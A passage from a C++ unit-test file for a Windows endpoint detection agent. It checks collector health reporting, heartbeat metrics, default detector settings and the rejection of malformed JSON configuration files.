#include <windows.h>
#include <aclapi.h>
#include <sddl.h>

#include <algorithm>
#include <atomic>
#include <cctype>
#include <condition_variable>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <io.h>
#include <initializer_list>
#include <iostream>
#include <memory>
#include <mutex>
#include <sstream>
#include <stdexcept>
#include <unordered_map>
#include <unordered_set>
#include <vector>
#include <thread>

#include "alerter.h"
#include "amsi_enricher.h"
#include "auto_responder.h"
#include "behavior_enricher_tests.h"
#include "collector.h"
#include "collector_reg_watch.h"
#include "collector_startup_watch.h"
#include "config.h"
#include "edr_event.h"
#include "event_bus.h"
#include "file_reputation.h"
#include "process_query.h"
#include "rule_engine.h"
#include "silverfox_tests.h"
#include "detector_tests.h"
#include "c2_beacon_detector_tests.h"
#include "ransom_burst_detector_tests.h"
#include "dns_beacon_detector_tests.h"
#include "lateral_movement_detector_tests.h"
#include "logon_brute_force_detector_tests.h"
#include "password_spray_detector_tests.h"
#include "kerberoast_detector_tests.h"
#include "process_hollowing_detector_tests.h"
#include "memory_scanner_detector_tests.h"
#include "driver_load_detector_tests.h"
#include "canary_detector_tests.h"
#include "hook_persistence_detector_tests.h"
#include "task_abuse_detector_tests.h"
#include "masquerade_detector_tests.h"
#include "accessibility_hijack_detector_tests.h"
#include "av_tamper_detector_tests.h"
#include "timestomp_detector_tests.h"
#include "obfuscation_detector_tests.h"
#include "lsass_dump_detector_tests.h"
#include "fileless_attack_detector_tests.h"
#include "api_hook_detector_tests.h"
#include "remote_access_detector_tests.h"
#include "credential_dumping_detector_tests.h"
#include "data_exfiltration_detector_tests.h"
#include "privilege_escalation_detector_tests.h"
#include "ntlm_relay_detector_tests.h"
#include "browser_theft_detector_tests.h"
#include "browser_extension_detector_tests.h"
#include "archive_staging_detector_tests.h"
#include "bits_abuse_detector_tests.h"
#include "doh_abuse_detector_tests.h"
#include "service_install_detector_tests.h"
#include "office_persist_detector_tests.h"
#include "shortcut_persist_detector_tests.h"
#include "indirect_exec_detector_tests.h"
#include "screensaver_persist_detector_tests.h"
#include "svc_path_abuse_detector_tests.h"
#include "service_dll_hijack_detector_tests.h"
#include "dll_search_order_detector_tests.h"
#include "svc_recovery_detector_tests.h"
#include "com_hijack_detector_tests.h"
#include "winlogon_hijack_detector_tests.h"
#include "mshta_abuse_detector_tests.h"
#include "dotnet_proxy_exec_detector_tests.h"
#include "wsl_abuse_detector_tests.h"
#include "msdt_abuse_detector_tests.h"
#include "software_discovery_detector_tests.h"
#include "net_share_discovery_detector_tests.h"
#include "nonstandard_port_egress_detector_tests.h"
#include "iso_mount_detector_tests.h"
#include "ps_profile_detector_tests.h"
#include "firewall_rule_detector_tests.h"
#include "local_account_detector_tests.h"
#include "ppid_spoof_detector_tests.h"
#include "net_discovery_detector_tests.h"
#include "host_profile_detector_tests.h"
#include "private_key_detector_tests.h"
#include "share_change_detector_tests.h"
#include "pe_anomaly_tests.h"
#include "downgrade_attack_detector_tests.h"
#include "dpapi_abuse_detector_tests.h"
#include "email_collection_detector_tests.h"
#include "etw_script_tamper_detector_tests.h"
#include "forced_auth_detector_tests.h"
#include "golden_ticket_detector_tests.h"
#include "gpo_abuse_detector_tests.h"
#include "hidden_artifacts_detector_tests.h"
#include "history_tamper_detector_tests.h"
#include "hive_copy_detector_tests.h"
#include "hosts_redirect_detector_tests.h"
#include "iis_module_detector_tests.h"
#include "input_simulation_detector_tests.h"
#include "logon_script_persist_detector_tests.h"
#include "lsa_package_detector_tests.h"
#include "motw_bypass_detector_tests.h"
#include "netsh_helper_detector_tests.h"
#include "network_sniffing_detector_tests.h"
#include "ntds_dit_detector_tests.h"
#include "pass_the_hash_detector_tests.h"
#include "password_cracking_detector_tests.h"
#include "path_interception_detector_tests.h"
#include "ransom_ops_detector_tests.h"
#include "rdp_session_hijack_detector_tests.h"
#include "reg_cred_hunt_detector_tests.h"
#include "remote_exec_detector_tests.h"
#include "secboot_tamper_detector_tests.h"
#include "shim_db_detector_tests.h"
#include "signed_binary_abuse_detector_tests.h"
#include "sip_hijack_detector_tests.h"
#include "ssh_key_persistence_detector_tests.h"
#include "ticket_cache_abuse_detector_tests.h"
#include "token_impersonation_detector_tests.h"
#include "handle_guard_detector_tests.h"
#include "clipboard_theft_detector_tests.h"
#include "named_pipe_abuse_detector_tests.h"
#include "web_exfil_detector_tests.h"
#include "wifi_cred_theft_detector_tests.h"
#include "winrm_abuse_detector_tests.h"
#include "winrm_config_tamper_detector_tests.h"
#include "xsl_script_detector_tests.h"
#include "eventlog_tamper_detector_tests.h"
#include "ssh_abuse_detector_tests.h"
#include "shadow_copy_detector_tests.h"
#include "persistence_burst_detector_tests.h"
#include "mailbox_delegate_detector_tests.h"
#include "mailbox_rule_detector_tests.h"
#include "llmnr_poison_detector_tests.h"
#include "netprovider_persist_detector_tests.h"
#include "password_vault_detector_tests.h"
#include "arp_poison_detector_tests.h"
#include "disk_wipe_detector_tests.h"
#include "boot_provider_persist_detector_tests.h"
#include "cloud_metadata_detector_tests.h"
#include "gpp_password_detector_tests.h"
#include "control_panel_proxy_detector_tests.h"
#include "hidden_user_account_detector_tests.h"
#include "password_policy_discovery_detector_tests.h"
#include "msi_package_install_detector_tests.h"
#include "log_enumeration_detector_tests.h"
#include "webhook_notifier_tests.h"
#include "alerter_sink_tests.h"
#include "triage_pack_tests.h"
#include "acl_abuse_detector_tests.h"
#include "amsi_bypass_detector_tests.h"
#include "appinit_dll_detector_tests.h"
#include "as_rep_roast_detector_tests.h"
#include "cert_abuse_detector_tests.h"
#include "cor_profiler_hijack_detector_tests.h"
#include "cred_file_hunt_detector_tests.h"
#include "dcsync_detector_tests.h"
#include "dev_util_proxy_detector_tests.h"
#include "cmstp_bypass_detector_tests.h"
#include "file_assoc_detector_tests.h"
#include "hidden_window_detector_tests.h"
#include "new_rule_detectors_tests.h"
#include "cryptominer_detector_tests.h"
#include "anti_analysis_detector_tests.h"
#include "script_host_abuse_detector_tests.h"
#include "account_op_detector_tests.h"
#include "tunnel_tool_detector_tests.h"
#include "surveillance_detector_tests.h"
#include "webshell_detector_tests.h"
#include "usb_exfil_detector_tests.h"
#include "persistence_chain_detector_tests.h"
#include "lolbin_parent_child_detector_tests.h"
#include "lolbin_chain_detector_tests.h"
#include "powershell_download_execute_detector_tests.h"
#include "dll_hijack_detector_tests.h"
#include "defense_evasion_detector_tests.h"
#include "discovery_recon_detector_tests.h"
#include "reg_modify_detector_tests.h"
#include "wmi_exec_detector_tests.h"
#include "local_collect_detector_tests.h"
#include "lateral_transfer_detector_tests.h"
#include "threat_intel_detector_tests.h"
#include "lateral_chain_detector_tests.h"
#include "correlation_engine_tests.h"
#include "endpoint_identity_tests.h"
#include "incident_store_health_tests.h"
#include "reporter_spool_tests.h"
#include "rdp_chain_detector_tests.h"
#include "uac_bypass_detector_tests.h"
#include "wmi_persistence_detector_tests.h"
#include "ransom_precursor_detector_tests.h"
#include "registry_persistence_detector_tests.h"
#include "anti_forensics_detector_tests.h"
#include "time_change_detector_tests.h"
#include "privileged_group_detector_tests.h"
#include "rdp_parser_tests.h"
#include "port_scan_detector_tests.h"
#include "response_server.h"
#include "response_actions.h"
#include "quarantine_actions.h"
#include "health_heartbeat.h"
#include "health_snapshot_tests.h"
#include "telemetry_delivery_integration_tests.h"
#include "telemetry_contract_tests.h"
#include "reporter.h"
#include "reporter_delivery_tests.h"
#include "json_lite.h"
#include "powershell_parser.h"
#include "powershell_reassembler.h"
#include "sysmon_parser.h"
#include "security_log_parser.h"
#include "taskscheduler_parser.h"
#include "wmi_parser.h"

using namespace edr;

#ifdef EDR_IMONITOR_AVAILABLE
void RunIMonitorMappingTests();
#endif
void RunAuditChainRecoveryTests();
void RunResponseStreamReplayTests();

namespace edr {
ICollector* CreateStartupWatchCollector(std::vector<std::string> dirs);
}

static void CreateDirs(const std::wstring& path);
static void RemoveTree(const std::wstring& dir);
static std::string ReadWholeFile(const std::string& path);

#define CHECK(condition) do { \
    if (!(condition)) { \
        std::cerr << "check failed at line " << __LINE__ << ": " #condition "\n"; \
        throw std::runtime_error("native test check failed"); \
    } \
} while (0)

static void TestCollectorRuntimeHealth() {
    class FakeCollector final : public ICollector {
    public:
        bool Start(EventBus*) override { return false; }
        void Stop() override {}
        CollectorHealthSnapshot GetHealthSnapshot() const override {
            if (throws) throw std::runtime_error("collector query failed");
            CollectorHealthSnapshot sample;
            sample.supported = true;
            sample.running = true;
            sample.queueDropped = 7;
            sample.parseErrors = 2;
            sample.lastSuccess100ns = 133000000000000001ULL;
            if (custom) {
                sample.state = "session_query_failed";
                sample.countersAvailable = true;
                sample.counters = {{"session_query_status", ERROR_ACCESS_DENIED}};
            }
            return sample;
        }
        bool throws = false;
        bool custom = false;
    } collector;
    const auto sampled = SampleCollectorHealth("fake", &collector);
    CHECK(sampled.state == "running");
    CHECK(sampled.countersAvailable);
    CHECK(sampled.counters.at("queue_dropped") == 7);
    CHECK(sampled.counters.at("parse_errors") == 2);
    CHECK(sampled.lastSuccess100ns == "133000000000000001");
    collector.custom = true;
    const auto sourceSpecific = SampleCollectorHealth("etw", &collector);
    CHECK(sourceSpecific.state == "session_query_failed");
    CHECK(sourceSpecific.counters.size() == 1);
    CHECK(sourceSpecific.counters.at("session_query_status") == ERROR_ACCESS_DENIED);
    CHECK(sourceSpecific.counters.count("queue_dropped") == 0);
    collector.throws = true;
    const auto unavailable = SampleCollectorHealth("fake", &collector);
    CHECK(unavailable.state == "unavailable");
    CHECK(!unavailable.countersAvailable);
    CHECK(SampleCollectorHealth("missing", nullptr).state == "unavailable");
    class UnsupportedCollector final : public ICollector {
    public:
        bool Start(EventBus*) override { return true; }
        void Stop() override {}
    } unsupported;
    CHECK(SampleCollectorHealth("legacy", &unsupported).state == "unsupported");
}

static void TestReporterHealthMetrics() {
    Reporter reporter("http://127.0.0.1:1", "", 2);
    reporter.Enqueue("one");
    reporter.Enqueue("two");
    reporter.Enqueue("three");
    CHECK(reporter.DroppedCount() == 1);
    CHECK(reporter.QueuedCount() == 2);

    EventBus bus(8);
    const std::string summary = "test\"\\\n" + std::string(600, 'x');
    HealthHeartbeat heartbeat(1, &bus, nullptr, summary, &reporter, nullptr,
        [] {
            HealthComponent component;
            component.name = "alerts";
            component.state = "failed";
            component.countersAvailable = true;
            component.counters["write_failures"] = 2;
            return std::vector<HealthComponent>{component};
        });
    const std::string outputPath = "edr-native-health-metrics.jsonl";
    const int savedStderr = _dup(_fileno(stderr));
    CHECK(savedStderr >= 0);
    FILE* redirected = nullptr;
    CHECK(freopen_s(&redirected, outputPath.c_str(), "w", stderr) == 0);
    CHECK(redirected != nullptr);
    CHECK(heartbeat.Start());
    Sleep(1200);
    heartbeat.Stop();
    std::fflush(stderr);
    CHECK(_dup2(savedStderr, _fileno(stderr)) == 0);
    _close(savedStderr);
    const std::string line = ReadWholeFile(outputPath);
    CHECK(line.find("\"reporter_queued\":2") != std::string::npos);
    CHECK(line.find("\"reporter_dropped\":1") != std::string::npos);
    CHECK(line.find("\"sampling\":\"periodic\"") != std::string::npos);
    CHECK(line.find("\"reporter_enabled\":true") != std::string::npos);
    CHECK(line.find("\"event_reporter_enabled\":false") != std::string::npos);
    CHECK(line.find("\"event_reporter_queued\":null") != std::string::npos);
    CHECK(line.find("\"event_reporter_dropped\":null") != std::string::npos);
    const size_t jsonStart = line.find('{');
    CHECK(jsonStart != std::string::npos);
    const auto sample = jsonlite::parse(line.substr(jsonStart));
    CHECK(sample.find("collectors")->asString() == summary);
    CHECK(sample.find("components")->array.size() == 1);
    const auto& component = sample.find("components")->array[0];
    CHECK(component.find("state")->asString() == "failed");
    CHECK(component.find("counters")->find("write_failures")->asNumber() == 2);
    DeleteFileA(outputPath.c_str());
    HealthHeartbeat unavailable(1, &bus, nullptr, "", nullptr, nullptr,
        []() -> std::vector<HealthComponent> {
            throw std::runtime_error("diagnostic unavailable");
        });
    const auto failed = jsonlite::parse(unavailable.Snapshot());
    CHECK(failed.find("diagnostics")->asString() == "unavailable");
    CHECK(failed.find("components")->array.empty());
    const std::string utf8Summary = std::string(4095, 'a') + u8"中";
    HealthHeartbeat bounded(1, &bus, nullptr, utf8Summary, nullptr, nullptr);
    const auto boundedSample = jsonlite::parse(bounded.Snapshot());
    CHECK(boundedSample.find("collectors")->str == std::string(4095, 'a'));
    Reporter failedReporter("", "", 2);
    CHECK(!failedReporter.Start());
    HealthHeartbeat failedStartup(1, &bus, nullptr, "", nullptr,
                                  &failedReporter);
    const auto startupSample = jsonlite::parse(failedStartup.Snapshot());
    CHECK(startupSample.find("event_reporter_enabled")->asBool());
    const auto* startupState = startupSample.find("event_reporter_runtime_state");
    CHECK(startupState != nullptr);
    CHECK(startupState->asString() == "start_failed");
}

/* Detection-rule suites are silent on success; print each name so a thrown
 * exception (including bare map::at out_of_range from a CHECK argument)
 * identifies the offending suite. */
#define RUN_SUITE(suite) do { \
    std::fprintf(stderr, "[suite] " #suite "\n"); \
    suite(); \
} while (0)

static void TestConfigDefault() {
    Config config;
    CHECK(!config.enableSysmon);
    CHECK(!config.enableSysmonImageLoad);
    CHECK(!config.enableSysmonProcessAccess);
    CHECK(!config.enableSysmonRemoteThread);
    CHECK(!config.enableIMonitorProcessOpen);
    CHECK(!config.enableIMonitorRemoteThread);
    CHECK(!config.enableWmiCollector);
    CHECK(config.wmiQueueCapacity == 512);
    CHECK(config.wmiWorkers == 2);
    CHECK(config.sysmonQueueCapacity == 512);
    CHECK(config.sysmonWorkers == 2);
    CHECK(!config.fileReputationEnable);
    CHECK(config.fileReputationMaxBytes == 64ULL * 1024ULL * 1024ULL);
    CHECK(!config.responseChannelEnable);
    CHECK(!config.responseEnableProcessTermination);
    CHECK(config.responsePipeName == R"(\\.\pipe\edr-response-v1)");
    CHECK(config.responseCommandKeyFile.empty());
    CHECK(config.responseAuditPath.empty());
    CHECK(!config.responseEnableQuarantine);
    CHECK(config.responseQuarantineDir.empty());
    CHECK(config.responseQuarantineMaxFileBytes == 268435456ULL);
    CHECK(config.responseMaxTreeSize == 32);
    CHECK(!config.autoResponseTreeTermination);
    CHECK(!config.autoResponseSuspendBeforeTerminate);
    CHECK(!config.amsiEnable);
    CHECK(config.amsiMaxContentChars == 4096);
    CHECK(!config.enableTaskSchedulerLog);
    CHECK(config.taskSchedulerQueueCapacity == 512);
    CHECK(config.taskSchedulerWorkers == 2);
    CHECK(config.taskSchedulerMaxXmlBytes == 128 * 1024);
    CHECK(!config.enablePowerShellLog);
    CHECK(config.powerShellQueueCapacity == 512);
    CHECK(config.powerShellWorkers == 2);
    CHECK(config.powerShellMaxXmlBytes == 512 * 1024);
    CHECK(config.powerShellMaxScriptChars == 128 * 1024);
    CHECK(!config.powerShellReassemblyEnable);
    CHECK(config.powerShellReassemblyMaxFragments == 64);
    CHECK(config.powerShellReassemblyMaxAssembledBytes == 1024 * 1024);
    CHECK(config.powerShellReassemblyStateCapacity == 256);
    CHECK(config.powerShellReassemblyMaxBufferedBytes == 32 * 1024 * 1024);
    CHECK(config.powerShellReassemblyTimeoutSeconds == 30);
    CHECK(!config.enableStartupWatch);
    CHECK(config.startupWatchDirs.empty());
    CHECK(!config.behaviorEnrichEnable);
    CHECK(config.behaviorEnrichStateCapacity == 8192);
    CHECK(config.behaviorEnrichWindowSeconds == 300);
    CHECK(config.behaviorEnrichLsassBurstWindowSeconds == 60);
    CHECK(config.behaviorEnrichLsassBurstThresholdBytes == 4194304ULL);
    CHECK(!config.enableHooksRpcCreateProcess);
    CHECK(!config.enableHooksWindowsHook);
    CHECK(!config.enableHooksService);
    CHECK(!config.enableHooksCom);
    CHECK(!config.enableHooksInjection);
    CHECK(!config.enableHooksHandle);
    CHECK(!config.enableHooksInput);
    CHECK(!config.enableHooksSystem);
CHECK(!config.enableHooksSurveillance);
    CHECK(!config.enableHooksPowerShell);
    CHECK(!config.c2BeaconEnable);
    CHECK(config.c2BeaconWindowSeconds == 3600);
    CHECK(config.c2BeaconStateCapacity == 4096);
    CHECK(config.c2BeaconMinRepeatEndpoints == 3);
    CHECK(config.c2BeaconMinConnectionsPerEndpoint == 2);
    CHECK(!config.ransomBurstEnable);
    CHECK(config.ransomBurstWindowSeconds == 120);
    CHECK(config.ransomBurstStateCapacity == 8192);
    CHECK(config.ransomBurstMinFileCount == 30);
    CHECK(config.ransomBurstMinDistinctExtensions == 15);
    CHECK(!config.processHollowingEnable);
    CHECK(config.processHollowingMinScore == 55);
    CHECK(config.processHollowingDedupWindowSeconds == 30);
    CHECK(config.processHollowingStateCapacity == 1024);
    CHECK(!config.dllHijackEnable);
    CHECK(!config.defenseEvasionEnable);
    CHECK(config.defenseEvasionWindowSeconds == 300);
    CHECK(config.defenseEvasionStateCapacity == 1024);
    CHECK(config.defenseEvasionMinTechniques == 2);
    CHECK(config.defenseEvasionDedupSeconds == 600);
    CHECK(!config.discoveryReconEnable);
    CHECK(config.discoveryReconWindowSeconds == 300);
    CHECK(config.discoveryReconStateCapacity == 2048);
    CHECK(config.discoveryReconMinTechniques == 3);
    CHECK(config.discoveryReconDedupSeconds == 600);
    /* 2026-09-13 batch: reg_modify / wmi_exec / local_collect / lateral_transfer */
    CHECK(!config.regModifyEnable);
    CHECK(config.regModifyMinScore == 55);
    CHECK(config.regModifyDedupWindowSeconds == 300);
    CHECK(config.regModifyStateCapacity == 1024);
    CHECK(!config.wmiExecEnable);
    CHECK(config.wmiExecMinScore == 55);
    CHECK(config.wmiExecDedupWindowSeconds == 300);
    CHECK(config.wmiExecStateCapacity == 1024);
    CHECK(!config.localCollectEnable);
    CHECK(config.localCollectMinScore == 55);
    CHECK(config.localCollectDedupWindowSeconds == 300);
    CHECK(config.localCollectStateCapacity == 1024);
    CHECK(!config.lateralTransferEnable);
    CHECK(config.lateralTransferMinScore == 55);
    CHECK(config.lateralTransferDedupWindowSeconds == 300);
    CHECK(config.lateralTransferStateCapacity == 1024);
    CHECK(!config.passwordSprayEnable);
    CHECK(config.passwordSprayWindowSeconds == 900);
    CHECK(config.passwordSprayStateCapacity == 4096);
    CHECK(config.passwordSprayMinFailures == 10);
    CHECK(config.passwordSprayMinDistinctUsers == 5);
    CHECK(config.passwordSpraySuccessFollowupSeconds == 300);
    CHECK(config.passwordSprayDedupSeconds == 600);
    CHECK(config.passwordSprayMaxFailuresPerSource == 256);
    CHECK(!config.kerberoastBurstEnable);
    CHECK(config.kerberoastBurstWindowSeconds == 600);
    CHECK(config.kerberoastBurstStateCapacity == 4096);
    CHECK(config.kerberoastBurstMinServiceCount == 5);
    CHECK(config.kerberoastBurstDedupSeconds == 600);
    CHECK(config.kerberoastBurstMaxServicesPerRequester == 128);
    CHECK(!config.lolbinParentChildEnable);
    CHECK(config.lolbinParentChildMinScore == 50);
    CHECK(!config.ransomPrecursorEnable);
    CHECK(config.ransomPrecursorWindowSeconds == 180);
    CHECK(config.ransomPrecursorStateCapacity == 256);
    CHECK(config.ransomPrecursorMinTechniques == 2);
    CHECK(config.ransomPrecursorDedupSeconds == 300);
    CHECK(!config.enableRdpLog);
    CHECK(config.rdpLogQueueCapacity == 512);
    CHECK(config.rdpLogWorkers == 2);
    CHECK(config.rdpLogMaxXmlBytes == 128 * 1024);
}

static void TestProcessCommandLineQuery() {
    std::string commandLine = ReadProcessCommandLine(GetCurrentProcessId());
    CHECK(!commandLine.empty());
    std::transform(commandLine.begin(), commandLine.end(), commandLine.begin(),
        [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
    CHECK(commandLine.find("edr_native_tests") != std::string::npos);
    CHECK(ReadProcessCommandLine(0).empty());
}

static void WriteAmsiConfig(const char* data) {
    std::ofstream out("edr-native-amsi-config.json", std::ios::binary);
    out << data;
}

static void WriteHooksConfig(const char* data) {
    std::ofstream out("edr-native-hooks-config.json", std::ios::binary);
    out << data;
}

static void TestAmsiConfigStrictAtomic() {
    std::string error;
    Config config;
    WriteAmsiConfig(R"({"amsi":{"enable":true,"max_content_chars":256}})");
    CHECK(LoadConfigFile("edr-native-amsi-config.json", config, error));
    CHECK(config.amsiEnable && config.amsiMaxContentChars == 256);
    for (const char* value : {
        R"({"amsi":true})", R"({"amsi":{"enable":"true"}})",
        R"({"amsi":{"max_content_chars":255}})",
        R"({"amsi":{"max_content_chars":32769}})",
        R"({"amsi":{"max_content_chars":256.5}})",
        R"({"amsi":{"enable":true,"unknown":1}})",
        R"({"amsi":{"enable":true,"enable":false}})"}) {
        WriteAmsiConfig(value);
        Config unchanged;
        unchanged.amsiMaxContentChars = 1234;
        CHECK(!LoadConfigFile("edr-native-amsi-config.json", unchanged, error));
        CHECK(!unchanged.amsiEnable && unchanged.amsiMaxContentChars == 1234);
    }
    WriteAmsiConfig(R"({"amsi":{"enable":true,"max_content_chars":32768}})");
    Config maximum;
    CHECK(LoadConfigFile("edr-native-amsi-config.json", maximum, error));
    CHECK(maximum.amsiEnable && maximum.amsiMaxContentChars == 32768);
    DeleteFileA("edr-native-amsi-config.json");
}

static void TestHooksConfigStrictAtomic() {
    std::string error;
    Config config;
    WriteHooksConfig(R"({"enable_hooks_rpc_create_process":true,"enable_hooks_windows_hook":true,"enable_hooks_service":true,"enable_hooks_com":true,"enable_hooks_injection":true,"enable_hooks_handle":true,"enable_hooks_input":true,"enable_hooks_system":true,"enable_hooks_surveillance":true,"enable_hooks_powershell":true})");
    CHECK(LoadConfigFile("edr-native-hooks-config.json", config, error));
    CHECK(config.enableHooksRpcCreateProcess);
    CHECK(config.enableHooksWindowsHook);
    CHECK(config.enableHooksService);
    CHECK(config.enableHooksCom);
    CHECK(config.enableHooksInjection);
    CHECK(config.enableHooksHandle);
    CHECK(config.enableHooksInput);
    CHECK(config.enableHooksSystem);
    CHECK(config.enableHooksSurveillance);
    CHECK(config.enableHooksPowerShell);

WriteHooksConfig(R"({"enable_hooks_service":"true"})");
    Config unchanged;
    unchanged.enableHooksPowerShell = true;
    CHECK(!LoadConfigFile("edr-native-hooks-config.json", unchanged, error));
    CHECK(!unchanged.enableHooksService);
    CHECK(unchanged.enableHooksPowerShell);
    DeleteFileA("edr-native-hooks-config.json");
}

static void WriteBeaconBurstConfig(const char* data) {
    std::ofstream out("edr-native-beacon-burst-config.json", std::ios::binary);
    out << data;
}

static void TestBeaconAndBurstConfigStrictAtomic() {
    std::string error;
    Config config;
    WriteBeaconBurstConfig(R"({"c2_beacon":{"enable":true,"window_seconds":1800,"state_capacity":512,"min_repeat_endpoints":5,"min_connections_per_endpoint":3},"ransom_burst":{"enable":true,"window_seconds":60,"state_capacity":1024,"min_file_count":50,"min_distinct_extensions":20}})");
    CHECK(LoadConfigFile("edr-native-beacon-burst-config.json", config, error));
    CHECK(config.c2BeaconEnable && config.c2BeaconWindowSeconds == 1800);
    CHECK(config.c2BeaconStateCapacity == 512);
    CHECK(config.c2BeaconMinRepeatEndpoints == 5);
    CHECK(config.c2BeaconMinConnectionsPerEndpoint == 3);
    CHECK(config.ransomBurstEnable && config.ransomBurstWindowSeconds == 60);
    CHECK(config.ransomBurstStateCapacity == 1024);
    CHECK(config.ransomBurstMinFileCount == 50);
    CHECK(config.ransomBurstMinDistinctExtensions == 20);
    for (const char* value : {
        R"({"c2_beacon":"true"})",
        R"({"c2_beacon":{"enable":false,"bogus_key":1}})",
        R"({"c2_beacon":{"window_seconds":0}})",
        R"({"ransom_burst":"true"})",
        R"({"ransom_burst":{"enable":false,"bogus_key":1}})",
        R"({"ransom_burst":{"window_seconds":0}})"}) {
        WriteBeaconBurstConfig(value);
        Config unchanged;
        unchanged.ransomBurstEnable = true;
        CHECK(!LoadConfigFile("edr-native-beacon-burst-config.json", unchanged, error));
        CHECK(unchanged.ransomBurstEnable);
        CHECK(!unchanged.c2BeaconEnable);
    }
    DeleteFileA("edr-native-beacon-burst-config.json");
}

static void WriteLogonBruteConfig(const char* data) {
    std::ofstream out("edr-native-logon-brute-config.json", std::ios::binary);
    out << data;
}

static void TestLogonBruteConfigStrictAtomic() {
    std::string error;
    Config config;
    WriteLogonBruteConfig(R"({"logon_brute_force":{"enable":true,"window_seconds":600,"state_capacity":2048,"min_failures":15,"dedup_seconds":900}})");
    CHECK(LoadConfigFile("edr-native-logon-brute-config.json", config, error));
    CHECK(config.logonBruteForceEnable);
    CHECK(config.logonBruteForceWindowSeconds == 600);
    CHECK(config.logonBruteForceStateCapacity == 2048);
    CHECK(config.logonBruteForceMinFailures == 15);
    CHECK(config.logonBruteForceDedupSeconds == 900);
    for (const char* value : {
        R"({"logon_brute_force":"true"})",
        R"({"logon_brute_force":{"enable":false,"bogus_key":1}})",
        R"({"logon_brute_force":{"min_failures":1}})",
        R"({"logon_brute_force":{"window_seconds":0}})",
        R"({"logon_brute_force":{"dedup_seconds":90000}})"}) {
        WriteLogonBruteConfig(value);
        Config unchanged;
        unchanged.logonBruteForceEnable = true;
        CHECK(!LoadConfigFile("edr-native-logon-brute-config.json", unchanged, error));
        CHECK(unchanged.logonBruteForceEnable);
        CHECK(!unchanged.c2BeaconEnable);
    }
    DeleteFileA("edr-native-logon-brute-config.json");
}

static void WriteProcessHollowingConfig(const char* data) {
    std::ofstream out("edr-native-hollowing-config.json", std::ios::binary);
    out << data;
}

static void TestProcessHollowingConfigStrictAtomic() {
    std::string error;
    Config config;
    WriteProcessHollowingConfig(R"({"process_hollowing":{"enable":true,"min_score":70,"dedup_window_seconds":120,"state_capacity":2048}})");
    CHECK(LoadConfigFile("edr-native-hollowing-config.json", config, error));
    CHECK(config.processHollowingEnable);
    CHECK(config.processHollowingMinScore == 70);
    CHECK(config.processHollowingDedupWindowSeconds == 120);
    CHECK(config.processHollowingStateCapacity == 2048);
    for (const char* value : {
        R"({"process_hollowing":"true"})",
        R"({"process_hollowing":{"enable":"true"}})",
        R"({"process_hollowing":{"enable":false,"bogus_key":1}})",
        R"({"process_hollowing":{"min_score":19}})",
        R"({"process_hollowing":{"min_score":101}})",
        R"({"process_hollowing":{"dedup_window_seconds":4}})",
        R"({"process_hollowing":{"dedup_window_seconds":3601}})",
        R"({"process_hollowing":{"state_capacity":255}})",
        R"({"process_hollowing":{"state_capacity":65537}})"}) {
        WriteProcessHollowingConfig(value);
        Config unchanged;
        unchanged.processHollowingEnable = true;
        unchanged.processHollowingMinScore = 88;
        CHECK(!LoadConfigFile("edr-native-hollowing-config.json", unchanged, error));
        CHECK(unchanged.processHollowingEnable);
        CHECK(unchanged.processHollowingMinScore == 88);
        CHECK(unchanged.processHollowingDedupWindowSeconds == 30);
        CHECK(unchanged.processHollowingStateCapacity == 1024);
    }
    DeleteFileA("edr-native-hollowing-config.json");
}

static void WriteNewDetectorConfig(const char* data) {
    std::ofstream out("edr-native-new-detector-config.json", std::ios::binary);
    out << data;
}

static void TestNewDetectorConfigStrictAtomic() {
    std::string error;
    Config config;
    WriteNewDetectorConfig(R"({"memory_scanner":{"enable":true,"min_score":70,"dedup_window_seconds":120,"state_capacity":2048},"driver_load":{"enable":true,"min_score":60,"dedup_window_seconds":300,"state_capacity":512},"fileless_attack":{"enable":true,"min_score":65,"dedup_window_seconds":240,"state_capacity":1024},"api_hook":{"enable":true,"min_score":75,"dedup_window_seconds":180,"state_capacity":256}})");
    CHECK(LoadConfigFile("edr-native-new-detector-config.json", config, error));
    CHECK(config.memoryScannerEnable);
    CHECK(config.memoryScannerMinScore == 70);
    CHECK(config.memoryScannerDedupWindowSeconds == 120);
    CHECK(config.memoryScannerStateCapacity == 2048);
    CHECK(config.driverLoadEnable);
    CHECK(config.driverLoadMinScore == 60);
    CHECK(config.driverLoadDedupWindowSeconds == 300);
    CHECK(config.driverLoadStateCapacity == 512);
    CHECK(config.filelessEnable);
    CHECK(config.filelessMinScore == 65);
    CHECK(config.filelessDedupWindowSeconds == 240);
    CHECK(config.filelessStateCapacity == 1024);
    CHECK(config.apiHookEnable);
    CHECK(config.apiHookMinScore == 75);
    CHECK(config.apiHookDedupWindowSeconds == 180);
    CHECK(config.apiHookStateCapacity == 256);
    for (const char* value : {
        R"({"memory_scanner":"true"})",
        R"({"memory_scanner":{"enable":"true"}})",
        R"({"memory_scanner":{"enable":false,"bogus_key":1}})",
        R"({"memory_scanner":{"min_score":9}})",
        R"({"memory_scanner":{"min_score":101}})",
        R"({"memory_scanner":{"dedup_window_seconds":-1}})",
        R"({"memory_scanner":{"state_capacity":15}})",
        R"({"memory_scanner":{"state_capacity":65537}})",
        R"({"driver_load":{"enable":false,"bogus_key":1}})",
        R"({"driver_load":{"min_score":9}})",
        R"({"driver_load":{"state_capacity":65537}})",
        R"({"fileless_attack":{"min_score":9}})",
        R"({"fileless_attack":{"state_capacity":65537}})",
        R"({"api_hook":{"min_score":101}})",
        R"({"api_hook":{"state_capacity":15}})"}) {
        WriteNewDetectorConfig(value);
        Config unchanged;
        unchanged.memoryScannerEnable = true;
        unchanged.memoryScannerMinScore = 88;
        unchanged.driverLoadEnable = true;
        unchanged.driverLoadMinScore = 88;
        unchanged.filelessEnable = true;
        unchanged.filelessMinScore = 88;
        unchanged.apiHookEnable = true;
        unchanged.apiHookMinScore = 88;
        CHECK(!LoadConfigFile("edr-native-new-detector-config.json", unchanged, error));
        CHECK(unchanged.memoryScannerEnable);
        CHECK(unchanged.memoryScannerMinScore == 88);
        CHECK(unchanged.memoryScannerDedupWindowSeconds == 60);
        CHECK(unchanged.memoryScannerStateCapacity == 2048);
        CHECK(unchanged.driverLoadEnable);
        CHECK(unchanged.driverLoadMinScore == 88);
        CHECK(unchanged.driverLoadDedupWindowSeconds == 300);
        CHECK(unchanged.driverLoadStateCapacity == 1024);
        CHECK(unchanged.filelessEnable);
        CHECK(unchanged.filelessMinScore == 88);
        CHECK(unchanged.filelessDedupWindowSeconds == 300);
        CHECK(unchanged.filelessStateCapacity == 4096);
